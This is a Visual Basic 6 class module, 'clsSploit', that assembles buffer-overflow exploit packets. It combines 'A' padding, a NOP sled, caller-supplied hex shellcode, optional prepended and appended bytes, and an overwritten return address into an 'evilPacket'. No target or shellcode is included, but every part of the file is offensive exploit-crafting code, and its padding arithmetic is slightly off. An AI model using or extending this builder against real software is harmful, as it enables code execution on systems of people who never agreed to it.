VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsSploit"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Public retOffset As String      ' return offset in hex
Public shellcode As String      ' shellcode in hex
Public evilPacket As String     ' our final packet is stored here
Public bufferLen As Integer     ' the length we have to work with
Public prepend As Boolean       ' do we have any data to prepend?
Public prependBytes As String   ' What data are we prepending?
Public append As Boolean        ' do we have any data to append?
Public appendBytes As String    ' What data are we appending?
Public useNops As Boolean       ' do we want to use nops to slide into shellcode?
Public nopCount As Integer      ' how many nops before shellcode?

'Anything below here is just for flavor.
Public expName As String
Public CVEID As String
Public OSINFO As String




Private Sub Class_Initialize()

    'Debug.Print "New exploit initialized!"
    
End Sub


Private Function makePadding(count As Integer) As String
    'creates some padding for us,
    'for now we pad with 'A', but later
    'we will be able to pad with random data
    
    Dim myPad As String

    
    For i = 1 To count
        myPad = myPad & "A"
    Next i
    
    makePadding = myPad
    
End Function

Public Function craftSploitCode() As Integer 'returns error code
    Dim myPacket As String
    Dim junk As String
    
    shellcode = Replace(shellcode, " ", "")
    shellcode = HexToString(shellcode)
    retOffset = HexToStr(retOffset)
    
    If useNops = True Then
        junk = makePadding(bufferLen - Len(shellcode) - nopCount)
        myPacket = junk
    Else
        junk = makePadding(bufferLen - Len(shellcode))
        myPacket = junk
        nopCount = 0
    End If
    
    If prepend = True Then
        myPacket = myPacket & HexToStr(prependBytes)
    End If
    
    myPacket = myPacket & makeNops(nopCount) & shellcode
        
    If append = True Then
        myPacket = myPacket & HexToStr(appendBytes)
    End If
    
    myPacket = myPacket & retOffset
     
    'MsgBox StringToHex(myPacket)
    
    evilPacket = myPacket
    
End Function

Private Function makeNops(count As Integer) As String

    'creates some nops for us
    Dim myNops As String
    
    For i = 1 To count
        myNops = myNops & HexToString(90)
    Next i
    
    makeNops = myNops
    
End Function
